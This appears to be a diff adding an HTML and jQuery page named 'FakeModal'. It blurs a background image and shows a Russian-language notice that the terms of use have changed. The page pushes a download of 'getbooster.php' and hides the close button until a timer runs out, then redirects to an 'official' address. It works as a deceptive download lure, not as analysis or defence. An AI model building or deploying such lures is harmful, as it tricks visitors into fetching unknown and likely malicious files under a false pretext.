@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FakeModal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="content">
+    <!-- <img src="./main-bg.png" ondragstart="return false" alt=""> -->
+  </div>
+  <div class="modal-fade"></div>
+  <div class="modal">
+    <div class="modal-wrapper">
+      <img class="close" ondragstart="return false" src="./close.svg" alt="">
+      <h1 class="modal-title">Изменились правила использования...</h1>
+      <a href="./getbooster.php" download class="modal-action modal-action-1">Look</a>
+      <a class="modal-action modal-action-2">Я уже посмотрел</a>
+      <span class="modal-desc">&#169; 2020 Назва компании. All rights reserved</span>
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"
+    integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg=="
+    crossorigin="anonymous"></script>
+  <script src="./script.js"></script>
+  <script>
+    $(".close").on("click", function () {
+      window.location.href = official
+    })
+    $(".modal-action-1").on("click", function () {
+      setTimeout(() => {
+        $('.close').css('opacity', '1')
+        $('.close').css('pointer-events', 'all')
+      }, closeTimeout);
+      setTimeout(() => {
+        $(".modal-action-1").css('display', 'none')
+        $(".modal-action-2").css('display', 'inline-block')
+      }, btnTimeout);
+    })
+    $(".modal-action-2").on('click', function () {
+      window.location.href = official
+    })
+  </script>
+  <style>
+    body {
+      max-width: 100%;
+      max-height: 100vh;
+      overflow: hidden;
+      margin: 0px;
+    }
+    .modal-fade {
+      min-width: 100%;
+      min-height: 100vh;
+      position: absolute;
+      top: 0px;
+      left: 0px;
+      background: rgba(50, 50, 50, 0.3);
+    }
+    .content {
+      -webkit-filter: blur(4px);
+      -moz-filter: blur(4px);
+      -o-filter: blur(4px);
+      -ms-filter: blur(4px);
+      filter: blur(4px);
+      width: 100%;
+      min-height: 100vh;
+      background: url("./main-bg.png") no-repeat 50% 50%/cover;
+    }
+    .content img {
+    
+    }
+    .modal {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      height: 310px;
+      min-width: 500px;
+      background: #fff;
+      box-shadow: 0px 0px 20px 1px rgba(0, 0, 0, 0.2);
+      border-radius: 6px;
+      user-select: none;
+    }
+    .modal-title {
+      font-family: 'Rubik', sans-serif;
+      font-size: 32px;
+      color: #000;
+      text-align: center;
+      display: block;
+      max-width: 500px;
+      margin: 0px auto;
+    }
+    .modal-wrapper {
+      padding: 70px 10px 60px 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      height: calc(100% - 130px);
+    }
+    .modal-action {
+      border-radius: 40px;
+      padding: 10px 40px;
+      color: #fff;
+      background: rgba(231, 117, 18, .8);
+      font-family: 'Rubik', sans-serif;
+      font-weight: 500;
+      font-size: 22px;
+      text-transform: uppercase;
+      display: inline-block;
+      border: none;
+      outline: none;
+      cursor: pointer;
+      margin-top: auto;
+      text-decoration: none;
+    }
+    .modal-action:hover {
+      background: rgba(231, 117, 18, 1);
+    }
+    .modal-desc {
+      position: absolute;
+      bottom: 15px;
+      left: 50%;
+      transform: translate(-50%, 0);
+      text-align: center;
+      display: block;
+      width: 100%;
+      font-family: 'Rubik', sans-serif;
+      font-weight: 300;
+    }
+    .close {
+      position: absolute;
+      width: 25px;
+      height: 25px;
+      right: 15px;
+      top: 15px;
+      cursor: pointer;
+      opacity: 0;
+      pointer-events: none;
+      transition-duration: .3s;
+    }
+    .modal-action-2 {
+      display: none;
+    }
+    @media screen and (max-width: 500px) {
+      .modal {
+        min-width: 1px;
+        max-width: 100%;
+        width: calc(100% - 20px);
+      }
+    }
+  </style>
+</body>
+</html>
